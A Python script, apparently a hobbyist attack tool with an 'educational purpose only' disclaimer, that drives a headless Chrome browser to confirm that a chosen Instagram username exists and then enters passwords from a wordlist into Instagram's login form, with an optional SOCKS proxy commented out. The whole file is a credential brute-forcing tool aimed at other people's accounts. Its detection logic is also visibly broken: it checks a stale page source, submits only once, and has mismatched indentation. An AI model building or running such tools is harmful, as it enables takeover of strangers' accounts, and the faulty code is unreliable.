import pyfiglet
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
import time
import socks
import socket

# Set up a SOCKS proxy
# socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 1080)
# socket.socket = socks.socksocket

banner = pyfiglet.figlet_format("Instagram Bruteforcer")
print(banner)
print("For Educational Purpose Only. Author : Roshan Bhatia IG @2kwattz\n")
time.sleep(2)
print("Please enter the account's username")
username = input()

timer_delay = int(input("Enter Bruteforce timer delay"))

def startBruteforce(driver):
    try:
        driver.get(f"https://www.instagram.com/accounts/login/")
        time.sleep(3)

        loginpage_source = driver.page_source
        soup = BeautifulSoup(loginpage_source, 'html.parser')
# For Testing Purpose
        try:
            with open('soup_content.txt', 'w', encoding='utf-8') as file:
                file.write(str(soup))
        except:
            print("Can't use fs module.")

        loginForm = soup.find(id='loginForm')

        if loginForm:
            time.sleep(2)

            wordlist_input = int(
                input("Press 1 for default wordlist. 2 for custom wordlist path\n"))

            if wordlist_input == 1 or wordlist_input == 2:

                # Fetching the wordlist

                with open('wordlist.txt', 'r') as file:
                    print("Loading Passwords\n")
                    line_count = 0
                    for line in file:
                        line_count += 1
                    print(f"{line_count} default passwords loaded!")
                    
                try:
                    usernameField = WebDriverWait(
                        driver, 10).until(
                        EC.visibility_of_element_located(
                            (By.XPATH, '//*[@id="loginForm"]/div/div[1]/div/label/input')))
                    usernameField.send_keys(username)
                except BaseException:
                    print("Username field not found")

            try:
                passwordField = WebDriverWait(
                    driver, 10).until(
                    EC.visibility_of_element_located(
                        (By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input')))
                print(passwordField)
                with open('wordlist.txt', 'r') as file:
                    for line in file:
                     passwordField.send_keys(line)
                     print(f"Trying Password {line}")
                    #  print("Before clearing:", passwordField.get_attribute("value"))
                     time.sleep(timer_delay)
                     passwordField.click()
                     passwordField.clear()
                     driver.execute_script("arguments[0].focus();", passwordField)
                     driver.execute_script("arguments[0].value = '';", passwordField)
                     time.sleep(3)
                     if "Sorry, your password was incorrect" in loginpage_source:
                        passwordField.clear()
                        
                        print("Invalid Password")
                    else:
                        print(f"Password Found {line} ") 
                    #  if "Sorry, your password was incorrect" in loginpage_source:
                    
            except BaseException:
                print("User Interrupted or any other random error\n")
                print(f"\033[92m Closing the program. Have a nice day, My dear sir :) \033[0m")
            submitButton = WebDriverWait(
                driver, 10).until(
                EC.visibility_of_element_located(
                    (By.XPATH, '//*[@id="loginForm"]/div/div[3]/button')))
            submitButton.click()

        else:
            print("No form found on the webpage.")
        # Proceed with further processing
    except BaseException:

        print("Error")


def beginAttack():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")

    # Assuming you have Chrome WebDriver installed.
    driver = webdriver.Chrome(options=chrome_options)

    # Setting up user agent
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
    chrome_options.add_argument(f"user-agent={user_agent}")

    driver.get(f"https://www.instagram.com/{username}")

    if "Sorry, this page isn't available." in driver.page_source:
        status_code = 404
        print(
            f"\033[91mHTTP Request Failed. Status : {status_code} USER NOT FOUND!\n \033[0m")
        print(f"The Instagram account '{username}' does not exist.")
    else:
        status_code = 200
        print(
            f"\033[92mHTTP Request Successful. Status : {status_code} OK! USER LOCKED (GIMME TONE) \033[0m")
        print(f"Instagram account '{username}' found")
        startBruteforce(driver)

    driver.quit()


beginAttack()
